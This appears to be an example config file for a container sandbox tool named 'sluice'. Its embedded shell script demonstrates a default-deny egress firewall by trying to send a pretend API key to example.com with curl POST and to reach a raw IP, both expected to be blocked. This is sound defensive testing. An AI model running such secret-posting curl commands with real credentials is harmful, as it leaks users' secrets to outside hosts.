# The egress firewall, made visible - what untrusted code can and cannot reach.
#
# Usage: copy this file into an (empty) project dir as sluice.config.sh, then run `sluice`.
#   mkdir fw-demo && cp examples/firewall.config.sh fw-demo/sluice.config.sh
#   cd fw-demo && sluice
# It runs a short script and exits (no server, no port to open). Watch the output: a legit
# fetch to an allowlisted host succeeds, an exfil attempt to a non-allowlisted host is BLOCKED.
#
# What this demonstrates: the threat model, runnable. The container runs default-DROP egress -
# only allowlisted *hostnames* (here just the always-on base hosts) are reachable, so code
# that finds a secret cannot POST it anywhere you did not allow. No SLUICE_PORTS (not a server),
# no SLUICE_ALLOW_DOMAINS (api.github.com is a base host), no credentials.

SLUICE_RUN_CMD='
set -u
echo "== sluice egress firewall: what untrusted code can and cannot reach =="
secret="sk-demo-$$-pretend-leaked-key"   # imagine the code scraped this from the env or repo

echo
echo "1) legit egress to an ALLOWLISTED host (api.github.com is a base host)..."
curl -fsS -o /dev/null -w "   OK  reached api.github.com (HTTP %{http_code}) - allowed\n" \
  --max-time 12 https://api.github.com || echo "   (unexpected: an allowlisted host was unreachable)"

echo
echo "2) exfil attempt: POST the secret to a NON-allowlisted host (example.com)..."
if curl -fsS -o /dev/null --max-time 8 -X POST -d "stolen=$secret" https://example.com 2>/dev/null; then
  echo "   !!  reached example.com - the firewall is NOT working"
else
  echo "   BLOCKED  example.com is not on the allowlist - the secret never left the box"
fi

echo
echo "3) bypass attempt: connect straight to a raw IP, no DNS, no SNI (https://1.1.1.1)..."
if curl -fsS -o /dev/null --max-time 8 https://1.1.1.1 2>/dev/null; then
  echo "   !!  reached 1.1.1.1 - the firewall is NOT working"
else
  echo "   BLOCKED  a direct-IP TLS connection carries no SNI, so the proxy terminates it"
fi

echo
echo "Only allowlisted hostnames are reachable. Next:"
echo "   sluice doctor   - shows exactly which hosts were blocked this run"
echo "   sluice learn    - allow a host you actually need (writes SLUICE_ALLOW_DOMAINS)"
'
